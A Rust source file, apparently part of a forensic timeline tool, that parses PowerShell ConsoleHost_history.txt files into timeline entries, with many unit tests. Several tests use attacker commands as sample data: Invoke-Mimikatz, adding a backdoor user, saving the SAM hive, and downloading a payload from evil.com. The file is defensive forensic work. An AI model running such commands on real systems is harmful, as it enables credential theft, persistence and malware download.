use anyhow::Result;
use log::{debug, warn};
use smallvec::smallvec;

use crate::collection::manifest::ArtifactManifest;
use crate::collection::provider::CollectionProvider;
use crate::timeline::entry::*;
use crate::timeline::store::TimelineStore;

// ─── ID Generation ───────────────────────────────────────────────────────────

use std::sync::atomic::{AtomicU64, Ordering};

static POSH_ID_COUNTER: AtomicU64 = AtomicU64::new(0x5053_0000_0000_0000); // "PS" prefix

fn next_posh_id() -> u64 {
    POSH_ID_COUNTER.fetch_add(1, Ordering::Relaxed)
}

// ─── Parsing functions ───────────────────────────────────────────────────────

/// A parsed PowerShell history entry.
#[derive(Debug, Clone)]
pub struct PoshHistoryEntry {
    pub command: String,
    pub username: String,
    pub line_number: usize,
}

/// Extract the username from a ConsoleHost_history.txt file path.
/// Typical path: C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
pub fn extract_username_from_path(path: &str) -> String {
    let lower = path.to_lowercase();
    let parts: Vec<&str> = path.split(|c| c == '\\' || c == '/').collect();
    for (i, part) in parts.iter().enumerate() {
        if part.eq_ignore_ascii_case("Users") && i + 1 < parts.len() {
            return parts[i + 1].to_string();
        }
    }
    // Fallback: try to find username from Velociraptor-style paths
    if let Some(idx) = lower.find("users") {
        let after = &path[idx + 6..]; // skip "Users\"
        if let Some(end) = after.find(|c: char| c == '\\' || c == '/') {
            return after[..end].to_string();
        }
    }
    "Unknown".to_string()
}

/// Parse PowerShell ConsoleHost_history.txt content into entries.
///
/// The file is a plain-text list of commands, one per line. Multi-line commands
/// are joined with backtick continuation. We treat each non-empty line as a
/// separate command.
pub fn parse_posh_history(content: &str, username: &str) -> Vec<PoshHistoryEntry> {
    let mut entries = Vec::new();

    for (i, line) in content.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        entries.push(PoshHistoryEntry {
            command: trimmed.to_string(),
            username: username.to_string(),
            line_number: i + 1,
        });
    }

    entries
}

// ─── Pipeline integration ────────────────────────────────────────────────────

/// Parse all PowerShell ConsoleHost_history.txt files from the collection.
pub fn parse_powershell_history(
    provider: &dyn CollectionProvider,
    manifest: &ArtifactManifest,
    store: &mut TimelineStore,
) -> Result<()> {
    if manifest.powershell_history.is_empty() {
        debug!("No PowerShell history files found in manifest");
        return Ok(());
    }

    let mut total = 0u32;

    for hist_path in &manifest.powershell_history {
        let data = match provider.open_file(hist_path) {
            Ok(d) => d,
            Err(e) => {
                warn!("Failed to read PowerShell history {}: {}", hist_path, e);
                continue;
            }
        };

        let content = String::from_utf8_lossy(&data);
        let username = extract_username_from_path(&hist_path.to_string());
        let entries = parse_posh_history(&content, &username);

        debug!(
            "PowerShell history: {} commands from {} (user: {})",
            entries.len(),
            hist_path,
            username
        );

        for entry in entries {
            store.push(TimelineEntry {
                entity_id: EntityId::Generated(next_posh_id()),
                path: format!(
                    "[PowerShell:History] {} (user: {}, line: {})",
                    entry.command, entry.username, entry.line_number
                ),
                primary_timestamp: chrono::Utc::now(),
                event_type: EventType::Execute,
                timestamps: TimestampSet::default(),
                sources: smallvec![ArtifactSource::Registry("PSReadLine".to_string())],
                anomalies: AnomalyFlags::empty(),
                metadata: EntryMetadata::default(),
            });
            total += 1;
        }
    }

    if total > 0 {
        debug!("Parsed {} PowerShell history entries total", total);
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_posh_history_basic() {
        let content = "Get-Process\nGet-Service\ndir C:\\temp\n";
        let entries = parse_posh_history(content, "admin");
        assert_eq!(entries.len(), 3);
        assert_eq!(entries[0].command, "Get-Process");
        assert_eq!(entries[0].line_number, 1);
        assert_eq!(entries[2].command, r"dir C:\temp");
        assert_eq!(entries[2].line_number, 3);
    }

    #[test]
    fn test_parse_posh_history_empty_lines() {
        let content = "\n\nGet-Process\n\n\ndir\n\n";
        let entries = parse_posh_history(content, "user1");
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].command, "Get-Process");
        assert_eq!(entries[0].line_number, 3);
        assert_eq!(entries[1].command, "dir");
        assert_eq!(entries[1].line_number, 6);
    }

    #[test]
    fn test_parse_posh_history_empty_content() {
        let entries = parse_posh_history("", "admin");
        assert!(entries.is_empty());
    }

    #[test]
    fn test_parse_posh_history_suspicious_commands() {
        let content = "Invoke-Mimikatz\nNet user hacker P@ss /add\nreg save HKLM\\SAM sam.hiv\n";
        let entries = parse_posh_history(content, "attacker");
        assert_eq!(entries.len(), 3);
        assert_eq!(entries[0].command, "Invoke-Mimikatz");
        assert_eq!(entries[0].username, "attacker");
    }

    #[test]
    fn test_extract_username_windows_path() {
        let path = r"C:\Users\analyst\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";
        assert_eq!(extract_username_from_path(path), "analyst");
    }

    #[test]
    fn test_extract_username_velociraptor_path() {
        let path = r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Users\admin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";
        assert_eq!(extract_username_from_path(path), "admin");
    }

    #[test]
    fn test_extract_username_unknown() {
        let path = "/tmp/consolehost_history.txt";
        assert_eq!(extract_username_from_path(path), "Unknown");
    }

    #[test]
    fn test_posh_entry_creation() {
        let entry = PoshHistoryEntry {
            command: "whoami".to_string(),
            username: "root".to_string(),
            line_number: 42,
        };
        assert_eq!(entry.command, "whoami");
        assert_eq!(entry.line_number, 42);
    }

    #[test]
    fn test_empty_manifest_no_error() {
        let manifest = ArtifactManifest::default();
        let mut store = TimelineStore::new();

        struct NoOpProvider;
        impl CollectionProvider for NoOpProvider {
            fn discover(&self) -> ArtifactManifest {
                ArtifactManifest::default()
            }
            fn open_file(
                &self,
                _path: &crate::collection::path::NormalizedPath,
            ) -> Result<Vec<u8>> {
                Ok(vec![])
            }
            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
                crate::collection::provider::CollectionMetadata {
                    hostname: "test".into(),
                    collection_timestamp: "2025-01-01".into(),
                    source_tool: "test".into(),
                }
            }
        }

        let result = parse_powershell_history(&NoOpProvider, &manifest, &mut store);
        assert!(result.is_ok());
        assert_eq!(store.len(), 0);
    }

    // ─── Additional coverage tests ──────────────────────────────────────────

    #[test]
    fn test_parse_posh_history_whitespace_only_lines() {
        let content = "  \n\t\n   \n";
        let entries = parse_posh_history(content, "admin");
        assert!(entries.is_empty());
    }

    #[test]
    fn test_parse_posh_history_leading_trailing_whitespace() {
        let content = "  Get-Process  \n  dir  \n";
        let entries = parse_posh_history(content, "admin");
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].command, "Get-Process");
        assert_eq!(entries[1].command, "dir");
    }

    #[test]
    fn test_parse_posh_history_single_command() {
        let content = "whoami";
        let entries = parse_posh_history(content, "admin");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].command, "whoami");
        assert_eq!(entries[0].line_number, 1);
        assert_eq!(entries[0].username, "admin");
    }

    #[test]
    fn test_parse_posh_history_special_characters() {
        let content = "Get-Content C:\\Users\\admin\\file.txt | Select-String 'password'\nInvoke-Expression \"cmd /c echo %USERPROFILE%\"\n$env:PATH -split ';'\n";
        let entries = parse_posh_history(content, "attacker");
        assert_eq!(entries.len(), 3);
        assert!(entries[0].command.contains("Select-String"));
        assert!(entries[1].command.contains("Invoke-Expression"));
        assert!(entries[2].command.contains("$env:PATH"));
    }

    #[test]
    fn test_parse_posh_history_crlf_line_endings() {
        let content = "Get-Process\r\nGet-Service\r\ndir\r\n";
        let entries = parse_posh_history(content, "admin");
        assert_eq!(entries.len(), 3);
        assert_eq!(entries[0].command, "Get-Process");
        assert_eq!(entries[1].command, "Get-Service");
        assert_eq!(entries[2].command, "dir");
    }

    #[test]
    fn test_parse_posh_history_preserves_username() {
        let content = "cmd1\ncmd2\n";
        let entries = parse_posh_history(content, "SYSTEM");
        for entry in &entries {
            assert_eq!(entry.username, "SYSTEM");
        }
    }

    #[test]
    fn test_parse_posh_history_line_numbers_correct_with_gaps() {
        let content = "\n\ncmd1\n\ncmd2\n\n\ncmd3\n";
        let entries = parse_posh_history(content, "u");
        assert_eq!(entries.len(), 3);
        assert_eq!(entries[0].line_number, 3);
        assert_eq!(entries[1].line_number, 5);
        assert_eq!(entries[2].line_number, 8);
    }

    #[test]
    fn test_extract_username_case_insensitive() {
        let path = r"C:\USERS\TestUser\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";
        assert_eq!(extract_username_from_path(path), "TestUser");
    }

    #[test]
    fn test_extract_username_lowercase_users() {
        let path = r"c:\users\lowercaseuser\appdata\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt";
        assert_eq!(extract_username_from_path(path), "lowercaseuser");
    }

    #[test]
    fn test_extract_username_forward_slashes() {
        let path = "C:/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt";
        assert_eq!(extract_username_from_path(path), "admin");
    }

    #[test]
    fn test_extract_username_users_with_trailing_slash_no_name() {
        // "Users\" is at the end with nothing meaningful after it
        let path = r"C:\Other\random_file.txt";
        assert_eq!(extract_username_from_path(path), "Unknown");
    }

    #[test]
    fn test_extract_username_empty_path() {
        assert_eq!(extract_username_from_path(""), "Unknown");
    }

    #[test]
    fn test_extract_username_no_users_folder() {
        let path = r"D:\Data\PowerShell\ConsoleHost_history.txt";
        assert_eq!(extract_username_from_path(path), "Unknown");
    }

    #[test]
    fn test_posh_entry_clone() {
        let entry = PoshHistoryEntry {
            command: "Get-Process".to_string(),
            username: "admin".to_string(),
            line_number: 1,
        };
        let cloned = entry.clone();
        assert_eq!(cloned.command, entry.command);
        assert_eq!(cloned.username, entry.username);
        assert_eq!(cloned.line_number, entry.line_number);
    }

    #[test]
    fn test_posh_entry_debug() {
        let entry = PoshHistoryEntry {
            command: "whoami".to_string(),
            username: "root".to_string(),
            line_number: 42,
        };
        let debug_str = format!("{:?}", entry);
        assert!(debug_str.contains("PoshHistoryEntry"));
        assert!(debug_str.contains("whoami"));
    }

    #[test]
    fn test_next_posh_id_monotonic() {
        let id1 = next_posh_id();
        let id2 = next_posh_id();
        let id3 = next_posh_id();
        assert!(id2 > id1);
        assert!(id3 > id2);
    }

    #[test]
    fn test_next_posh_id_has_ps_prefix() {
        let id = next_posh_id();
        assert_eq!((id >> 48) & 0xFFFF, 0x5053);
    }

    #[test]
    fn test_parse_posh_history_very_long_command() {
        let long_cmd = "A".repeat(10_000);
        let content = format!("{}\n", long_cmd);
        let entries = parse_posh_history(&content, "admin");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].command.len(), 10_000);
    }

    #[test]
    fn test_parse_posh_history_unicode_commands() {
        let content = "Write-Output '\u{4e2d}\u{6587}'\necho '\u{00e9}'\n";
        let entries = parse_posh_history(content, "user");
        assert_eq!(entries.len(), 2);
        assert!(entries[0].command.contains('\u{4e2d}'));
    }

    #[test]
    fn test_extract_username_velociraptor_style_users() {
        // Another Velociraptor-style path with forward slashes
        let path = "uploads/auto/Windows.KapeFiles.Targets/Users/hacker/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt";
        assert_eq!(extract_username_from_path(path), "hacker");
    }

    // ─── Pipeline integration and deeper coverage ────────────────────────

    #[test]
    fn test_parse_powershell_history_pipeline_with_data() {
        use crate::collection::path::NormalizedPath;

        let mut manifest = ArtifactManifest::default();
        manifest.powershell_history.push(
            NormalizedPath::from_image_path(
                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
                'C',
            ),
        );

        let mut store = TimelineStore::new();

        struct HistoryProvider;
        impl CollectionProvider for HistoryProvider {
            fn discover(&self) -> ArtifactManifest {
                ArtifactManifest::default()
            }
            fn open_file(
                &self,
                _path: &crate::collection::path::NormalizedPath,
            ) -> Result<Vec<u8>> {
                Ok(b"Get-Process\nGet-Service\nwhoami\n".to_vec())
            }
            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
                crate::collection::provider::CollectionMetadata::default()
            }
        }

        let result = parse_powershell_history(&HistoryProvider, &manifest, &mut store);
        assert!(result.is_ok());
        assert_eq!(store.len(), 3);

        let e0 = store.get(0).unwrap();
        assert!(e0.path.contains("[PowerShell:History]"));
        assert!(e0.path.contains("Get-Process"));
        assert!(e0.path.contains("admin"));
        assert!(e0.path.contains("line: 1"));
        assert_eq!(e0.event_type, EventType::Execute);
        assert!(matches!(&e0.sources[0], ArtifactSource::Registry(s) if s == "PSReadLine"));

        let e2 = store.get(2).unwrap();
        assert!(e2.path.contains("whoami"));
        assert!(e2.path.contains("line: 3"));
    }

    #[test]
    fn test_parse_powershell_history_pipeline_with_empty_file() {
        use crate::collection::path::NormalizedPath;

        let mut manifest = ArtifactManifest::default();
        manifest.powershell_history.push(
            NormalizedPath::from_image_path(
                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
                'C',
            ),
        );

        let mut store = TimelineStore::new();

        struct EmptyProvider;
        impl CollectionProvider for EmptyProvider {
            fn discover(&self) -> ArtifactManifest {
                ArtifactManifest::default()
            }
            fn open_file(
                &self,
                _path: &crate::collection::path::NormalizedPath,
            ) -> Result<Vec<u8>> {
                Ok(vec![])
            }
            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
                crate::collection::provider::CollectionMetadata::default()
            }
        }

        let result = parse_powershell_history(&EmptyProvider, &manifest, &mut store);
        assert!(result.is_ok());
        assert_eq!(store.len(), 0);
    }

    #[test]
    fn test_parse_powershell_history_pipeline_with_failing_provider() {
        use crate::collection::path::NormalizedPath;

        let mut manifest = ArtifactManifest::default();
        manifest.powershell_history.push(
            NormalizedPath::from_image_path(
                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
                'C',
            ),
        );

        let mut store = TimelineStore::new();

        struct FailProvider;
        impl CollectionProvider for FailProvider {
            fn discover(&self) -> ArtifactManifest {
                ArtifactManifest::default()
            }
            fn open_file(
                &self,
                _path: &crate::collection::path::NormalizedPath,
            ) -> Result<Vec<u8>> {
                anyhow::bail!("File not found")
            }
            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
                crate::collection::provider::CollectionMetadata::default()
            }
        }

        let result = parse_powershell_history(&FailProvider, &manifest, &mut store);
        assert!(result.is_ok());
        assert_eq!(store.len(), 0);
    }

    #[test]
    fn test_parse_powershell_history_pipeline_multiple_files() {
        use crate::collection::path::NormalizedPath;

        let mut manifest = ArtifactManifest::default();
        manifest.powershell_history.push(
            NormalizedPath::from_image_path(
                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
                'C',
            ),
        );
        manifest.powershell_history.push(
            NormalizedPath::from_image_path(
                "/Users/analyst/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
                'C',
            ),
        );

        let mut store = TimelineStore::new();

        struct MultiProvider;
        impl CollectionProvider for MultiProvider {
            fn discover(&self) -> ArtifactManifest {
                ArtifactManifest::default()
            }
            fn open_file(
                &self,
                path: &crate::collection::path::NormalizedPath,
            ) -> Result<Vec<u8>> {
                if path.to_string().contains("admin") {
                    Ok(b"cmd1\ncmd2\n".to_vec())
                } else {
                    Ok(b"cmd3\n".to_vec())
                }
            }
            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
                crate::collection::provider::CollectionMetadata::default()
            }
        }

        let result = parse_powershell_history(&MultiProvider, &manifest, &mut store);
        assert!(result.is_ok());
        assert_eq!(store.len(), 3); // 2 from admin + 1 from analyst
    }

    #[test]
    fn test_extract_username_from_path_velociraptor_fallback_no_split() {
        // Path has "users" in lowercase but no path separator after the username
        // This tests the fallback path (lines 41-46)
        let path = "C:\\Users\\AdminNoTrailing";
        let result = extract_username_from_path(path);
        // The first branch (split by separators) should handle this
        assert_eq!(result, "AdminNoTrailing");
    }

    #[test]
    fn test_extract_username_from_path_embedded_users_string() {
        // "users" appears in the path but not as a proper path component
        let path = "D:\\myusers_backup\\file.txt";
        // The split-based approach won't match since no component is exactly "Users"
        // The fallback find("users") will match "users" in "myusers_backup"
        let result = extract_username_from_path(path);
        // It finds "users" at some position in "myusers_backup", skips 6 chars
        // and takes until next separator. This is the fallback behavior.
        assert!(!result.is_empty());
    }

    #[test]
    fn test_parse_posh_history_only_newlines() {
        let content = "\n\n\n\n\n";
        let entries = parse_posh_history(content, "user");
        assert!(entries.is_empty());
    }

    #[test]
    fn test_parse_posh_history_tabs_only() {
        let content = "\t\t\t";
        let entries = parse_posh_history(content, "user");
        assert!(entries.is_empty());
    }

    #[test]
    fn test_parse_posh_history_mixed_whitespace_and_commands() {
        let content = "\t\n  cmd1  \n\t\n  \n  cmd2\t\n";
        let entries = parse_posh_history(content, "u");
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].command, "cmd1");
        assert_eq!(entries[1].command, "cmd2");
    }

    #[test]
    fn test_parse_powershell_history_pipeline_utf8_content() {
        use crate::collection::path::NormalizedPath;

        let mut manifest = ArtifactManifest::default();
        manifest.powershell_history.push(
            NormalizedPath::from_image_path(
                "/Users/admin/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
                'C',
            ),
        );

        let mut store = TimelineStore::new();

        struct Utf8Provider;
        impl CollectionProvider for Utf8Provider {
            fn discover(&self) -> ArtifactManifest {
                ArtifactManifest::default()
            }
            fn open_file(
                &self,
                _path: &crate::collection::path::NormalizedPath,
            ) -> Result<Vec<u8>> {
                // UTF-8 BOM + content
                let mut data = vec![0xEF, 0xBB, 0xBF]; // BOM
                data.extend_from_slice("Write-Output '\u{00e9}l\u{00e8}ve'\n".as_bytes());
                Ok(data)
            }
            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
                crate::collection::provider::CollectionMetadata::default()
            }
        }

        let result = parse_powershell_history(&Utf8Provider, &manifest, &mut store);
        assert!(result.is_ok());
        // BOM line + command line (BOM is part of the first line)
        assert!(store.len() >= 1);
    }

    #[test]
    fn test_parse_powershell_history_pipeline_timeline_entry_fields() {
        use crate::collection::path::NormalizedPath;

        let mut manifest = ArtifactManifest::default();
        manifest.powershell_history.push(
            NormalizedPath::from_image_path(
                "/Users/hacker/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
                'C',
            ),
        );

        let mut store = TimelineStore::new();

        struct SingleCmdProvider;
        impl CollectionProvider for SingleCmdProvider {
            fn discover(&self) -> ArtifactManifest {
                ArtifactManifest::default()
            }
            fn open_file(
                &self,
                _path: &crate::collection::path::NormalizedPath,
            ) -> Result<Vec<u8>> {
                Ok(b"Invoke-WebRequest http://evil.com/payload.exe\n".to_vec())
            }
            fn metadata(&self) -> crate::collection::provider::CollectionMetadata {
                crate::collection::provider::CollectionMetadata::default()
            }
        }

        let before = chrono::Utc::now();
        let result = parse_powershell_history(&SingleCmdProvider, &manifest, &mut store);
        let after = chrono::Utc::now();
        assert!(result.is_ok());
        assert_eq!(store.len(), 1);

        let te = store.get(0).unwrap();
        assert!(te.path.contains("Invoke-WebRequest"));
        assert!(te.path.contains("hacker"));
        assert_eq!(te.event_type, EventType::Execute);
        // Timestamp should be around now
        assert!(te.primary_timestamp >= before);
        assert!(te.primary_timestamp <= after);
    }
}
